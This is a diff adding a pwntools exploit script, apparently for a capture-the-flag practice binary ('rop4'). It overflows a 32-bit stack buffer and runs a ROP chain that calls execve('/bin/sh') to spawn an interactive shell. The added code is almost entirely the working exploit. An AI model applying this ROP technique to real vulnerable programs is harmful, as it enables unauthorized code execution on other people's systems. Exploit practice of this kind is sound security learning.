@@ -115,3 +115,60 @@
  '\n'
  '**Disclaimer**: Ensure you have permission to test and exploit the binary, '
  'and use this code responsibly within legal and ethical boundaries.')
+
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386', os='linux')
+
+# Load the binary and set it in the context
+elf = ELF('./pwn/stack/rop-4/rop4')
+context.binary = elf
+
+# Enable verbose logging (optional)
+# context.log_level = 'debug'
+
+# Start the process (or connect remotely if needed)
+p = elf.process()
+
+# Find the offset to the return address
+# You can use cyclic patterns to find the exact offset
+# For this example, we'll assume the offset is 140 bytes
+offset = 140  # Adjust this value after verifying with cyclic patterns
+
+# Build the ROP chain
+rop = ROP(elf)
+
+# Addresses of gadgets (from the provided gadget list)
+pop_eax_ret = 0x080c28c6  # pop eax ; ret
+pop_ebx_ret = 0x080481ec  # pop ebx ; ret
+pop_ecx_ret = 0x080e3c2a  # pop ecx ; ret
+pop_edx_ret = 0x080551ca  # pop edx ; ret
+int_0x80 = 0x08049421     # int 0x80 ; ret (you may need to find this gadget)
+
+# Address of "/bin/sh" string in the binary
+bin_sh = next(elf.search(b'/bin/sh'))
+
+# Build the ROP chain to set up registers for syscall execve("/bin/sh", NULL, NULL)
+rop.raw(p32(pop_eax_ret))
+rop.raw(p32(0xb))          # syscall number for execve
+rop.raw(p32(pop_ebx_ret))
+rop.raw(p32(bin_sh))       # pointer to "/bin/sh"
+rop.raw(p32(pop_ecx_ret))
+rop.raw(p32(0x0))          # NULL
+rop.raw(p32(pop_edx_ret))
+rop.raw(p32(0x0))          # NULL
+rop.raw(p32(int_0x80))     # Trigger interrupt to invoke syscall
+
+# Print the ROP chain for debugging
+log.info('ROP chain:\n{}'.format(rop.dump()))
+
+# Build the payload
+payload = b"A" * offset
+payload += rop.chain()
+
+# Send the payload
+p.sendline(payload)
+
+# Switch to interactive mode to use the shell
+p.interactive()
